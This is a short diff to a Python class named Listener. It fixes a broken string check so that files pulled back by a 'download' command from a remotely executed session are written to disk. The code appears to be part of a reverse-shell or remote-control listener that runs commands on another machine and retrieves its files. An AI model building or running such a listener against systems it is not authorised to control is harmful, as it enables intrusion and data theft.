@@ -65,7 +65,7 @@ class Listener:
                     #with command[2] item in list specifying file
                 result = self.execute_remotely(command)
 
-                if command[0] == "download" and [-] Error " not in result: #
+                if command[0] == "download" and "[-] Error " not in result:
                     result = self.write_file(command[1], result)
             except Exception: #catch any errors that may occur, probably not good practice
                 result = "[-] Error during command execution."
